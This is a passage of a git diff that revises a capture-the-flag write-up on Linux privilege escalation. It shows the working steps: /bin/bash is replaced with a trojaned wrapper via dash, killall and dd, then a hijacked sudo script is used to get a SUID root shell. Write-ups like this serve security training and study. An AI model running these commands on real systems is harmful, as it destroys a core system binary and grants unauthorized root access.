+exec /tmp/bash.bak "$@"         # behave normally, pass all args through
 EOF
 ```
 
-- 🔍 *We spawn a `dash` shell, terminate all active bash shells, and copy our payload onto `/bin/bash`:*
+- 🔍 *Once done, now let's replace it with our `/bin/bash`:*
+
+```bash
+cp /tmp/evil_bash /bin/bash
+```
+
+```text
+cp: cannot create regular file '/bin/bash': Text file busy
+```
+
+- 🔍 *Okay so we got this error. I have searched about this error:*
+
+> [!NOTE]
+> **The ETXTBSY problem:**
+> Linux kernel prevents overwriting a binary that is currently being executed:
+> - Process 1: `/bin/bash` (your current shell) -> kernel locks it
+> - Process 2: `cp evil_bash /bin/bash` -> BLOCKED
+
+- 🔍 *Let's check:*
+
+```bash
+dd if=/tmp/evil_bash of=/bin/bash
+```
+
+```text
+dd: failed to open '/bin/bash': Text file busy
+```
+
+- 🔍 *I tried to change the command interpreter to `dash` (Debian Almquist shell), and then I killed the bash, so no concurrent processes take place:*
 
 ```bash
 dash
 ```
 
 ```bash
-$ killall -9 bash
+killall -9 bash
 ```
 
 ```bash
-$ dd if=/tmp/evil_bash of=/bin/bash
+dd if=/tmp/evil_bash of=/bin/bash
 ```
 
 ```text
@@ -999,31 +1245,27 @@ $ dd if=/tmp/evil_bash of=/bin/bash
 94 bytes copied, 0.00033013 s, 285 kB/s
 ```
 
-- 🔍 *Executing the elevated sudo wrapper script to trigger the hijacked shebang:*
-
 ```bash
-$ sudo /opt/syswatch/syswatch.sh --version
+sudo /opt/syswatch/syswatch.sh --version
 ```
 
 ```text
 1.0.0
 ```
 
-- 🔍 *Executing our newly created SUID root shell:*
-
 ```bash
-$ /tmp/rootbash -p
+/tmp/rootbash -p
 ```
 
 ```bash
-# whoami
+whoami
 ```
 
 ```text
 root
 ```
 
-- 🔍 *Root access achieved successfully. The flag is located at `/root/root.txt`.*
+- 🔍 *Done! Root access achieved successfully.*
 
 ---
 
